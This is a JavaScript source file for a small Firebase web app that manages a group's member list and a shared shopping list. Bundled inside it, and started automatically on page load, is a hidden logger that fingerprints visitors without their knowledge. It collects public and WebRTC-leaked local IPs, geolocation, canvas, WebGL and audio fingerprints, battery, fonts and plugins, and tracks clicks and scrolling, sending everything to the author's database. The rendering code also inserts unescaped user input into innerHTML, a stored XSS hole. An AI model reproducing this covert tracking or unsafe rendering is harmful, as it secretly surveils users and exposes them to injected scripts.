// 🔥 Конфигурация Firebase
const firebaseConfig = {
    apiKey: "AIzaSyCBHCqZ-e93SKKK4QuY0LD1egmlndRrhnY",
    authDomain: "trape-hata.firebaseapp.com",
    databaseURL: "https://trape-hata-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "trape-hata",
    storageBucket: "trape-hata.firebasestorage.app",
    messagingSenderId: "1029072503589",
    appId: "1:1029072503589:web:4a199e03788bb0f5c390cc"
};

// Инициализация Firebase
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// ==================== РАСШИРЕННЫЙ ЛОГГЕР ====================
class EnhancedLogger {
    constructor() {
        this.sessionId = this.generateUUID();
        this.startTime = performance.now();
        this.pageLoadTime = Date.now();
    }

    async logAll() {
        try {
            const data = {
                meta: {
                    timestamp: new Date().toISOString(),
                    sessionId: this.sessionId,
                    version: "1.0"
                },
                page: this.getPageInfo(),
                device: await this.getDeviceInfo(),
                network: await this.getNetworkInfo(),
                software: this.getSoftwareInfo(),
                performance: this.getPerformanceMetrics(),
                environment: this.getEnvironmentInfo(),
                fingerprints: {
                    canvas: this.getCanvasFingerprint(),
                    webgl: this.getWebGLFingerprint(),
                    audio: await this.getAudioFingerprint(),
                    fonts: await this.getFontList()
                },
                behavior: {
                    interactions: []
                }
            };

            // Добавляем геоданные
            data.geo = await this.getGeoData(data.network.publicIP);

            // Сохраняем в Firebase
            const logRef = database.ref('enhanced_logs').push(data);
            this.setupBehaviorTracking(logRef);
            
            return logRef.key;
        } catch (error) {
            console.error('Logger error:', error);
            database.ref('log_errors').push({
                error: error.message,
                timestamp: new Date().toISOString()
            });
            return null;
        }
    }

    // Генерация UUID
    generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    // Информация о странице
    getPageInfo() {
        return {
            url: window.location.href,
            referrer: document.referrer,
            title: document.title,
            origin: window.location.origin,
            parameters: {
                path: window.location.pathname,
                hash: window.location.hash,
                search: window.location.search
            }
        };
    }

    // Информация об устройстве
    async getDeviceInfo() {
        const battery = await this.getBatteryInfo();
        
        return {
            type: this.detectDeviceType(),
            screen: {
                resolution: {
                    width: window.screen.width,
                    height: window.screen.height,
                    available: {
                        width: window.screen.availWidth,
                        height: window.screen.availHeight
                    }
                },
                colorDepth: window.screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                orientation: window.screen.orientation?.type
            },
            hardware: {
                memory: navigator.deviceMemory || 'unknown',
                cores: navigator.hardwareConcurrency || 'unknown',
                battery: battery,
                touch: {
                    supported: 'ontouchstart' in window,
                    maxPoints: navigator.maxTouchPoints || 0
                }
            },
            gpu: this.getGPUInfo()
        };
    }

    // Информация о сети
    async getNetworkInfo() {
        const connection = navigator.connection || {};
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const { ip } = await ipResponse.json();
        
        return {
            publicIP: ip,
            localIPs: await this.getLocalIPs(),
            connection: {
                type: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData
            },
            headers: {
                userAgent: navigator.userAgent,
                languages: navigator.languages
            }
        };
    }

    // Информация о ПО
    getSoftwareInfo() {
        return {
            os: this.detectOS(),
            browser: this.detectBrowser(),
            engine: this.getBrowserEngine(),
            plugins: this.getPluginsList(),
            supported: {
                cookies: navigator.cookieEnabled,
                java: navigator.javaEnabled(),
                pdf: navigator.pdfViewerEnabled,
                webAssembly: typeof WebAssembly === 'object'
            }
        };
    }

    // Метрики производительности
    getPerformanceMetrics() {
        const perf = window.performance;
        return {
            timing: {
                navigationStart: perf.timing?.navigationStart,
                loadEventEnd: perf.timing?.loadEventEnd,
                domComplete: perf.timing?.domComplete
            },
            memory: perf.memory,
            now: perf.now(),
            timeOrigin: perf.timeOrigin
        };
    }

    // Информация об окружении
    getEnvironmentInfo() {
        return {
            online: navigator.onLine,
            doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack,
            secureContext: window.isSecureContext,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            dateFormat: new Date().toString()
        };
    }

    // ===== ДЕТАЛЬНЫЕ МЕТОДЫ СБОРА ДАННЫХ =====

    async getGeoData(ip) {
        try {
            const response = await fetch(`https://ipapi.co/${ip}/json/`);
            return await response.json();
        } catch (error) {
            return { error: 'Failed to fetch geo data' };
        }
    }

    async getBatteryInfo() {
        if (!navigator.getBattery) return null;
        
        try {
            const battery = await navigator.getBattery();
            return {
                level: battery.level,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch (e) {
            return null;
        }
    }

    async getLocalIPs() {
        return new Promise((resolve) => {
            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) return resolve([]);
            
            const pc = new RTCPeerConnection({iceServers: []});
            const ips = [];
            
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            
            pc.onicecandidate = (event) => {
                if (!event.candidate) {
                    pc.onicecandidate = null;
                    resolve(ips.filter(ip => ip && ip !== '0.0.0.0'));
                    return;
                }
                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(event.candidate.candidate)?.[1];
                if (ip) ips.push(ip);
            };
        });
    }

    detectDeviceType() {
        const ua = navigator.userAgent;
        if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
            return window.screen.width < 768 ? 'phone' : 'tablet';
        }
        return window.screen.width >= 1200 ? 'desktop' : 'laptop';
    }

    detectOS() {
        const ua = navigator.userAgent;
        if (/Windows/i.test(ua)) return 'Windows';
        if (/Mac/i.test(ua)) return 'MacOS';
        if (/Linux/i.test(ua)) return 'Linux';
        if (/Android/i.test(ua)) return 'Android';
        if (/iOS|iPhone|iPad|iPod/i.test(ua)) return 'iOS';
        return 'Unknown';
    }

    detectBrowser() {
        const ua = navigator.userAgent;
        if (/Firefox/i.test(ua)) return 'Firefox';
        if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) return 'Chrome';
        if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
        if (/Edge/i.test(ua)) return 'Edge';
        if (/Opera|OPR/i.test(ua)) return 'Opera';
        if (/MSIE|Trident/i.test(ua)) return 'IE';
        return 'Unknown';
    }

    getBrowserEngine() {
        const ua = navigator.userAgent;
        if (/AppleWebKit/i.test(ua)) return 'WebKit';
        if (/Gecko/i.test(ua)) return 'Gecko';
        if (/Trident/i.test(ua)) return 'Trident';
        if (/Blink/i.test(ua)) return 'Blink';
        return 'Unknown';
    }

    getPluginsList() {
        return Array.from(navigator.plugins || []).map(plugin => ({
            name: plugin.name,
            description: plugin.description,
            filename: plugin.filename
        }));
    }

    getGPUInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return null;
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null
        };
    }

    getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillStyle = "#f60";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#069";
        ctx.fillText("Canvas Fingerprint", 2, 15);
        
        return canvas.toDataURL();
    }

    getWebGLFingerprint() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return null;
        
        const result = {};
        const properties = [
            'VENDOR', 'RENDERER', 'VERSION', 'SHADING_LANGUAGE_VERSION',
            'MAX_TEXTURE_SIZE', 'MAX_VIEWPORT_DIMS'
        ];
        
        properties.forEach(prop => {
            const key = prop.toLowerCase();
            try {
                result[key] = gl.getParameter(gl[prop]);
            } catch (e) {
                result[key] = null;
            }
        });
        
        return result;
    }

    async getAudioFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            
            oscillator.connect(analyser);
            analyser.connect(audioContext.destination);
            oscillator.start();
            
            const buffer = new Float32Array(analyser.frequencyBinCount);
            analyser.getFloatFrequencyData(buffer);
            
            oscillator.stop();
            audioContext.close();
            
            return Array.from(buffer);
        } catch (e) {
            return null;
        }
    }

    async getFontList() {
        const baseFonts = [
            'Arial', 'Arial Black', 'Times New Roman', 
            'Courier New', 'Georgia', 'Verdana'
        ];
        
        const availableFonts = [];
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        const text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        
        context.textBaseline = "top";
        context.font = "72px monospace";
        const defaultWidth = context.measureText(text).width;
        
        for (const font of baseFonts) {
            context.font = `72px "${font}", monospace`;
            if (context.measureText(text).width !== defaultWidth) {
                availableFonts.push(font);
            }
        }
        
        return availableFonts;
    }

    setupBehaviorTracking(logRef) {
        // Отслеживание кликов
        document.addEventListener('click', (e) => {
            logRef.child('behavior/interactions').push({
                type: 'click',
                x: e.clientX,
                y: e.clientY,
                target: e.target.tagName,
                timestamp: new Date().toISOString()
            });
        }, { passive: true });

        // Отслеживание прокрутки
        let lastScrollReport = 0;
        window.addEventListener('scroll', () => {
            const now = Date.now();
            if (now - lastScrollReport > 1000) {
                lastScrollReport = now;
                logRef.child('behavior/interactions').push({
                    type: 'scroll',
                    position: window.scrollY,
                    max: document.body.scrollHeight - window.innerHeight,
                    timestamp: new Date().toISOString()
                });
            }
        }, { passive: true });

        // Отслеживание времени на странице
        window.addEventListener('beforeunload', () => {
            logRef.update({
                'behavior/timeOnPage': performance.now() - this.startTime,
                'behavior/pageCloseTime': new Date().toISOString()
            });
        });
    }
}

// ==================== ОСНОВНОЕ ПРИЛОЖЕНИЕ ====================
class PeopleList {
    constructor() {
        this.people = [];
        this.shoppingList = [];
        this.logger = new EnhancedLogger();
        this.initFirebaseListeners();
        this.logger.logAll();
    }

    initFirebaseListeners() {
        database.ref('people').on('value', (snapshot) => {
            this.people = snapshot.val() || [];
            renderPeopleList(this.people);
            if (currentStatusFilter) {
                renderFilteredPeople();
            }
        });

        database.ref('shopping').on('value', (snapshot) => {
            this.shoppingList = snapshot.val() || [];
            renderShoppingList();
        });
    }

    async savePeople() {
        try {
            await database.ref('people').set(this.people);
        } catch (error) {
            console.error("Ошибка сохранения:", error);
            alert("Ошибка: " + error.message);
        }
    }

    async addPerson(name, note = '', status = 'active') {
        const newId = this.people.length > 0 ? Math.max(...this.people.map(p => p.id)) + 1 : 1;
        const newPerson = {
            id: newId,
            name,
            note,
            status,
            joinDate: new Date().toISOString().split('T')[0]
        };
        this.people.push(newPerson);
        await this.savePeople();
        return newPerson;
    }

    async updatePerson(id, updates) {
        const index = this.people.findIndex(person => person.id === id);
        if (index !== -1) {
            this.people[index] = { ...this.people[index], ...updates };
            await this.savePeople();
            return this.people[index];
        }
        return null;
    }

    async changeStatus(id, newStatus) {
        return this.updatePerson(id, { status: newStatus });
    }

    async removeById(id) {
        this.people = this.people.filter(person => person.id !== id);
        await this.savePeople();
        return this.people;
    }

    getPeopleByStatus(status) {
        if (status === 'recent') {
            return this.people.filter(p => {
                const joinDate = new Date(p.joinDate);
                return joinDate > new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
            });
        }
        return this.people.filter(person => person.status === status);
    }

    getStats() {
        const active = this.people.filter(p => p.status === 'active').length;
        const banned = this.people.filter(p => p.status === 'banned').length;
        const legends = this.people.filter(p => p.status === 'legend').length;
        const unknown = this.people.filter(p => p.status === 'unknown').length;
        
        return {
            total: this.people.length,
            active,
            banned,
            legends,
            unknown,
            recent: this.people.filter(p => {
                const joinDate = new Date(p.joinDate);
                return joinDate > new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
            }).length
        };
    }

    search(query) {
        return this.people.filter(person => 
            person.name.toLowerCase().includes(query.toLowerCase()) ||
            (person.note && person.note.toLowerCase().includes(query.toLowerCase()))
        );
    }

    async saveShopping() {
        try {
            await database.ref('shopping').set(this.shoppingList);
        } catch (error) {
            console.error("Ошибка сохранения:", error);
            alert("Ошибка: " + error.message);
        }
    }

    async addShoppingItem(text) {
        const newId = this.shoppingList.length > 0 ? Math.max(...this.shoppingList.map(item => item.id)) + 1 : 1;
        const newItem = {
            id: newId,
            text,
            completed: false
        };
        this.shoppingList.push(newItem);
        await this.saveShopping();
        return newItem;
    }

    async removeShoppingItem(id) {
        this.shoppingList = this.shoppingList.filter(item => item.id !== id);
        await this.saveShopping();
        return this.shoppingList;
    }

    async toggleShoppingItem(id) {
        const item = this.shoppingList.find(item => item.id === id);
        if (item) {
            item.completed = !item.completed;
            await this.saveShopping();
        }
        return item;
    }

    getDuplicates() {
        const nameCounts = {};
        this.people.forEach(person => {
            nameCounts[person.name] = (nameCounts[person.name] || 0) + 1;
        });
        return Object.entries(nameCounts).filter(([_, count]) => count > 1).map(([name]) => name);
    }
}

// ==================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ====================
let currentTab = 'members';
let currentStatusFilter = null;
const trapHata = new PeopleList();

// ==================== DOM ЭЛЕМЕНТЫ ====================
const peopleListEl = document.getElementById('people-list');
const searchResultsEl = document.getElementById('search-results');
const shoppingListEl = document.getElementById('shopping-list');
const statsGridEl = document.getElementById('stats-grid');
const filteredPeopleListEl = document.getElementById('filtered-people-list');
const statusFilterTitleEl = document.getElementById('status-filter-title');
const tabs = document.querySelectorAll('.tab');
const tabContents = document.querySelectorAll('.tab-content');

// ==================== ФУНКЦИИ РЕНДЕРИНГА ====================
function renderPeopleList(people) {
    let html = '';
    
    if (people.length === 0) {
        html = '<div class="empty-state">Нет участников</div>';
    } else {
        people.forEach(person => {
            const statusClass = `status-${person.status}`;
            const cardClass = `${person.status}`;
            html += `
            <div class="person-card ${cardClass}">
                <div class="person-name">
                    ${person.name}
                    <span class="person-status ${statusClass}">${getStatusText(person.status)}</span>
                </div>
                ${person.note ? `<div class="person-note">${person.note}</div>` : ''}
                <div class="person-join-date">Дата вступления: ${person.joinDate}</div>
                <div class="person-actions">
                    <button onclick="trapHata.changeStatus(${person.id}, 'active')" class="btn-success">Актив</button>
                    <button onclick="trapHata.changeStatus(${person.id}, 'banned')" class="btn-danger">Бан</button>
                    <button onclick="trapHata.changeStatus(${person.id}, 'legend')" class="btn-legend">Легенда</button>
                    <button onclick="trapHata.changeStatus(${person.id}, 'unknown')" class="btn-unknown">ХЗ</button>
                    <button onclick="trapHata.removeById(${person.id})">Удалить</button>
                </div>
            </div>
            `;
        });
    }
    
    html += `
    <div class="add-card" id="add-card">
        <div class="add-form">
            <input type="text" id="add-name" placeholder="Имя" class="add-input">
            <input type="text" id="add-note" placeholder="Заметка" class="add-input">
            <button id="add-submit" class="add-submit">Добавить</button>
        </div>
    </div>
    `;
    
    peopleListEl.innerHTML = html;
    
    // Настройка кнопки добавления
    const addCard = document.getElementById('add-card');
    const addName = document.getElementById('add-name');
    const addNote = document.getElementById('add-note');
    const addSubmit = document.getElementById('add-submit');
    
    addCard.addEventListener('click', function(e) {
        if (!addCard.classList.contains('editing') && e.target === addCard) {
            addCard.classList.add('editing');
            addName.focus();
        }
    });
    
    addSubmit.addEventListener('click', async function() {
        const name = addName.value.trim();
        const note = addNote.value.trim();
        
        if (name) {
            await trapHata.addPerson(name, note, 'active');
            addName.value = '';
            addNote.value = '';
            addCard.classList.remove('editing');
        } else {
            alert('Введите имя участника!');
        }
    });
    
    document.addEventListener('click', function(e) {
        if (addCard.classList.contains('editing') && 
            !addCard.contains(e.target) && 
            e.target !== addSubmit) {
            addCard.classList.remove('editing');
        }
    });
    
    addName.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            addSubmit.click();
        }
    });
    
    addNote.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            addSubmit.click();
        }
    });
}

function renderFilteredPeople() {
    const people = currentStatusFilter 
        ? trapHata.getPeopleByStatus(currentStatusFilter)
        : trapHata.people;
    
    let html = '';
    
    if (people.length === 0) {
        const statusText = currentStatusFilter ? getStatusText(currentStatusFilter) : '';
        html = `<div class="empty-state">Нет участников${statusText ? ` со статусом "${statusText}"` : ''}</div>`;
    } else {
        people.forEach(person => {
            const statusClass = `status-${person.status}`;
            const cardClass = `${person.status}`;
            html += `
            <div class="person-card ${cardClass}">
                <div class="person-name">
                    ${person.name}
                    <span class="person-status ${statusClass}">${getStatusText(person.status)}</span>
                </div>
                ${person.note ? `<div class="person-note">${person.note}</div>` : ''}
                <div class="person-join-date">Дата вступления: ${person.joinDate}</div>
                <div class="person-actions">
                    <button onclick="trapHata.changeStatus(${person.id}, 'active')" class="btn-success">Актив</button>
                    <button onclick="trapHata.changeStatus(${person.id}, 'banned')" class="btn-danger">Бан</button>
                    <button onclick="trapHata.changeStatus(${person.id}, 'legend')" class="btn-legend">Легенда</button>
                    <button onclick="trapHata.changeStatus(${person.id}, 'unknown')" class="btn-unknown">ХЗ</button>
                    <button onclick="trapHata.removeById(${person.id})">Удалить</button>
                </div>
            </div>
            `;
        });
    }
    
    filteredPeopleListEl.innerHTML = html;
}

function renderStats() {
    const stats = trapHata.getStats();
    statsGridEl.innerHTML = `
        <div class="stat-card ${!currentStatusFilter ? 'active' : ''}" onclick="filterByStatus(null)">
            <div class="stat-value">${stats.total}</div>
            <div class="stat-label">Всего</div>
        </div>
        <div class="stat-card ${currentStatusFilter === 'active' ? 'active' : ''}" onclick="filterByStatus('active')">
            <div class="stat-value">${stats.active}</div>
            <div class="stat-label">Активные</div>
        </div>
        <div class="stat-card ${currentStatusFilter === 'banned' ? 'active' : ''}" onclick="filterByStatus('banned')">
            <div class="stat-value">${stats.banned}</div>
            <div class="stat-label">Забанены</div>
        </div>
        <div class="stat-card ${currentStatusFilter === 'legend' ? 'active' : ''}" onclick="filterByStatus('legend')">
            <div class="stat-value">${stats.legends}</div>
            <div class="stat-label">Легенды</div>
        </div>
        <div class="stat-card ${currentStatusFilter === 'unknown' ? 'active' : ''}" onclick="filterByStatus('unknown')">
            <div class="stat-value">${stats.unknown}</div>
            <div class="stat-label">ХЗ</div>
        </div>
        <div class="stat-card ${currentStatusFilter === 'recent' ? 'active' : ''}" onclick="filterByStatus('recent')">
            <div class="stat-value">${stats.recent}</div>
            <div class="stat-label">Новые</div>
        </div>
    `;
}

function renderShoppingList() {
    const items = trapHata.shoppingList;
    if (items.length === 0) {
        shoppingListEl.innerHTML = '<div class="empty-state">Список пуст</div>';
        return;
    }

    let html = '';
    items.forEach(item => {
        const itemClass = item.completed ? 'completed' : '';
        html += `
        <div class="shopping-item ${itemClass}">
            <div class="shopping-item-text">${item.text}</div>
            <div class="shopping-item-actions">
                <button onclick="trapHata.toggleShoppingItem(${item.id})">
                    ${item.completed ? 'Вернуть' : 'Куплено'}
                </button>
                <button onclick="trapHata.removeShoppingItem(${item.id})">Удалить</button>
            </div>
        </div>
        `;
    });
    shoppingListEl.innerHTML = html;
}

function renderSearchResults(results) {
    if (results.length === 0) {
        searchResultsEl.innerHTML = '<div class="empty-state">Ничего не найдено</div>';
        return;
    }

    let html = '<h3>Результаты:</h3><div class="people-list">';
    results.forEach(person => {
        html += `
        <div class="person-card">
            <div class="person-name">${person.name}</div>
            <div>Статус: ${getStatusText(person.status)}</div>
            ${person.note ? `<div>Заметка: ${person.note}</div>` : ''}
        </div>
        `;
    });
    html += '</div>';
    searchResultsEl.innerHTML = html;
}

function renderDuplicates() {
    const duplicates = trapHata.getDuplicates();
    if (duplicates.length === 0) {
        duplicatesListEl.innerHTML = '<div class="empty-state">Нет дубликатов</div>';
        return;
    }

    let html = '';
    duplicates.forEach(name => {
        html += `<div class="duplicate-item">${name}</div>`;
    });
    duplicatesListEl.innerHTML = html;
}

// ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
function getStatusText(status) {
    const statusTexts = {
        active: 'Активен',
        banned: 'Забанен',
        legend: 'Легенда',
        unknown: 'ХЗ'
    };
    return statusTexts[status] || status;
}

function filterByStatus(status) {
    currentStatusFilter = status === currentStatusFilter ? null : status;
    
    // Обновляем заголовок
    const statusText = currentStatusFilter ? getStatusText(currentStatusFilter) : 'Все участники';
    statusFilterTitleEl.textContent = currentStatusFilter ? `Участники: ${statusText}` : 'Все участники';
    
    // Обновляем статистику
    renderStats();
    
    // Показываем отфильтрованных участников
    renderFilteredPeople();
    
    // Прокручиваем к списку
    if (currentStatusFilter) {
        filteredPeopleListEl.scrollIntoView({ behavior: 'smooth' });
    }
}

// ==================== ОБРАБОТЧИКИ СОБЫТИЙ ====================
document.getElementById('search-btn').addEventListener('click', function() {
    const query = document.getElementById('search-member').value.trim();
    if (query) {
        const results = trapHata.search(query);
        renderSearchResults(results);
    } else {
        alert('Введите поисковый запрос!');
    }
});

document.getElementById('reset-search-btn').addEventListener('click', function() {
    document.getElementById('search-member').value = '';
    searchResultsEl.innerHTML = '';
});

document.getElementById('add-item-btn').addEventListener('click', async function() {
    const text = document.getElementById('new-item').value.trim();
    if (text) {
        await trapHata.addShoppingItem(text);
        document.getElementById('new-item').value = '';
    } else {
        alert('Введите название покупки!');
    }
});

tabs.forEach(tab => {
    tab.addEventListener('click', function() {
        const tabId = this.getAttribute('data-tab');
        tabs.forEach(t => t.classList.remove('active'));
        tabContents.forEach(c => c.classList.remove('active'));
        this.classList.add('active');
        document.getElementById(`${tabId}-tab`).classList.add('active');
        currentTab = tabId;
        
        if (tabId === 'stats') {
            renderStats();
            renderDuplicates();
        }
    });
});

// ==================== ИНИЦИАЛИЗАЦИЯ ====================
document.addEventListener('DOMContentLoaded', function() {
    // Добавляем возможность добавлять покупку по нажатию Enter
    document.getElementById('new-item').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            document.getElementById('add-item-btn').click();
        }
    });
    
    // Первоначальная загрузка
    renderStats();
});

// ==================== ГЛОБАЛЬНЫЕ ФУНКЦИИ ====================
window.trapHata = trapHata;
window.filterByStatus = filterByStatus;
